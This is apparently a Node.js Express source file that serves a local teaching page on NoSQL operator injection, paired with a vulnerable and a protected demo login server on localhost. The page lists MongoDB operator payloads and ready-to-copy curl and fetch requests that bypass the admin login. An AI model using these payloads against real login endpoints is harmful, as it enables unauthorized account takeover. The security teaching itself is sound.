/*
 * Terminal 2: cd demo-attacked/nosql-injection && npm run guide
 */

const express = require('express');

const app = express();
const PORT = 3023;
const VICTIM_PORT = 3022;
const PROTECTED_PORT = 3024;

const CURL_PAYLOAD = [
  'curl -s -X POST http://localhost:' + VICTIM_PORT + '/login \\',
  "  -H 'Content-Type: application/json' \\",
  "  -d '{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}' \\",
  '  -L',
].join('\n');

const FETCH_PAYLOAD = [
  "fetch('http://localhost:" + VICTIM_PORT + "/login', {",
  "  method: 'POST',",
  "  headers: { 'Content-Type': 'application/json' },",
  "  body: JSON.stringify({ username: 'admin', password: { $gt: '' } })",
  "}).then(r => console.log('Redirected to:', r.url))",
].join('\n');

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function buildGuideHtml() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NoSQL Injection — Attack Guide</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Courier New', Consolas, 'Liberation Mono', monospace;
      background: #0f172a;
      color: #e2e8f0;
      min-height: 100vh;
      line-height: 1.6;
      font-size: 0.875rem;
    }
    .page {
      max-width: 800px;
      margin: 0 auto;
      padding: 2rem 1.5rem 3rem;
    }
    h1 {
      font-size: 1.05rem;
      font-weight: 600;
      color: #f1f5f9;
      margin-bottom: 0.35rem;
    }
    .subtitle {
      font-size: 0.78rem;
      color: #64748b;
      margin-bottom: 2rem;
    }
    section { margin-bottom: 2rem; }
    h2 {
      font-size: 0.75rem;
      font-weight: 600;
      color: #94a3b8;
      text-transform: uppercase;
      letter-spacing: 0.07em;
      margin-bottom: 0.75rem;
    }
    pre {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 6px;
      padding: 1rem 1.15rem;
      font-size: 0.78rem;
      color: #cbd5e1;
      overflow-x: auto;
      line-height: 1.55;
      white-space: pre-wrap;
      word-break: break-word;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      border: 1px solid #334155;
      font-size: 0.78rem;
    }
    th {
      text-align: left;
      padding: 0.55rem 0.75rem;
      background: #162032;
      color: #94a3b8;
      border-bottom: 1px solid #334155;
    }
    td {
      padding: 0.55rem 0.75rem;
      border-bottom: 1px solid #334155;
      vertical-align: top;
    }
    tr:nth-child(even) td { background: #0f172a; }
    tr:nth-child(odd) td { background: #1e293b; }
    tr:last-child td { border-bottom: none; }
    td code { color: #fde047; font-size: 0.76rem; }
    .payload-box { margin-bottom: 1.25rem; }
    .payload-label {
      font-size: 0.72rem;
      color: #64748b;
      margin-bottom: 0.4rem;
    }
    .btn-copy {
      margin-top: 0.5rem;
      padding: 0.35rem 0.75rem;
      font-size: 0.75rem;
      font-family: inherit;
      cursor: pointer;
      border: 1px solid #475569;
      background: transparent;
      color: #94a3b8;
      border-radius: 3px;
    }
    .btn-copy:hover {
      border-color: #64748b;
      color: #cbd5e1;
    }
    .prose {
      font-size: 0.78rem;
      color: #94a3b8;
      line-height: 1.65;
    }
    hr {
      border: none;
      border-top: 1px solid #334155;
      margin: 2.5rem 0 1.25rem;
    }
    .demo-controls {
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
    }
    .demo-controls button {
      padding: 0.35rem 0.75rem;
      font-size: 0.75rem;
      font-family: inherit;
      cursor: pointer;
      border: 1px solid #475569;
      background: transparent;
      color: #94a3b8;
      border-radius: 3px;
    }
    .demo-controls button:hover {
      border-color: #64748b;
      color: #cbd5e1;
    }
  </style>
</head>
<body>
  <div class="page">
    <h1>NoSQL Injection — Attack Guide</h1>
    <p class="subtitle">How operator injection bypasses MongoDB authentication</p>

    <section>
      <h2>How MongoDB login queries work</h2>
      <pre>// Normal login — what the developer intended
db.users.findOne({ username: "alice", password: "hunter2" })
// → returns user object only if both fields match exactly</pre>
    </section>

    <section>
      <h2>The injection</h2>
      <pre>// What the attacker sends (HTTP request body):
{ "username": "admin", "password": { "$gt": "" } }

// What Express parses and the server builds:
db.users.findOne({ username: "admin", password: { $gt: "" } })
// → "$gt": "" means "password greater than empty string"
// → any non-empty password satisfies this — admin is returned
// → attacker is logged in without knowing the password</pre>
    </section>

    <section>
      <h2>Other operators that work</h2>
      <table>
        <thead>
          <tr>
            <th>Payload</th>
            <th>Effect</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>{ "$gt": "" }</code></td>
            <td>Greater than empty string — matches any non-empty password</td>
          </tr>
          <tr>
            <td><code>{ "$ne": "x" }</code></td>
            <td>Not equal to "x" — matches any password except "x"</td>
          </tr>
          <tr>
            <td><code>{ "$regex": ".*" }</code></td>
            <td>Regex match-all — matches anything</td>
          </tr>
          <tr>
            <td><code>{ "$exists": true }</code></td>
            <td>Field exists — matches any user with a password field</td>
          </tr>
        </tbody>
      </table>
    </section>

    <section>
      <h2>Copy payloads</h2>
      <div class="payload-box">
        <div class="payload-label">curl (login bypass)</div>
        <pre id="curl-payload">${escapeHtml(CURL_PAYLOAD)}</pre>
        <button type="button" class="btn-copy" data-target="curl-payload">Copy</button>
      </div>
      <div class="payload-box">
        <div class="payload-label">browser console fetch</div>
        <pre id="fetch-payload">${escapeHtml(FETCH_PAYLOAD)}</pre>
        <button type="button" class="btn-copy" data-target="fetch-payload">Copy</button>
      </div>
    </section>

    <section>
      <h2>Why JSON endpoints are specifically vulnerable</h2>
      <p class="prose">
        This attack only works because the endpoint accepts JSON
        (Content-Type: application/json) and express.json() parses nested objects.
        A form-encoded endpoint (application/x-www-form-urlencoded) cannot send a
        nested object — password[$gt]= arrives as the literal string "$gt=".
        JSON is required for object injection.<br><br>
        SQL injection does not have this limitation — it works on any string input.
        That is why SQL and NoSQL injection have different but equally dangerous
        attack surfaces.
      </p>
    </section>

    <hr>

    <div class="demo-controls">
      <button type="button" id="btn-vulnerable">Vulnerable DevAuth :${VICTIM_PORT}</button>
      <button type="button" id="btn-protected">Protected DevAuth :${PROTECTED_PORT}</button>
    </div>
  </div>

  <script>
    document.querySelectorAll('.btn-copy').forEach(function (btn) {
      btn.addEventListener('click', function () {
        var id = btn.getAttribute('data-target');
        var text = document.getElementById(id).textContent;
        navigator.clipboard.writeText(text).then(function () {
          btn.textContent = 'Copied!';
          setTimeout(function () { btn.textContent = 'Copy'; }, 1500);
        });
      });
    });
    document.getElementById('btn-vulnerable').addEventListener('click', function () {
      window.open('http://localhost:${VICTIM_PORT}/login', '_blank');
    });
    document.getElementById('btn-protected').addEventListener('click', function () {
      window.open('http://localhost:${PROTECTED_PORT}/login', '_blank');
    });
  </script>
</body>
</html>`;
}

app.get('/', function (req, res) {
  res.send(buildGuideHtml());
});

app.listen(PORT, function () {
  console.log('NoSQL attack guide running at http://localhost:' + PORT);
});
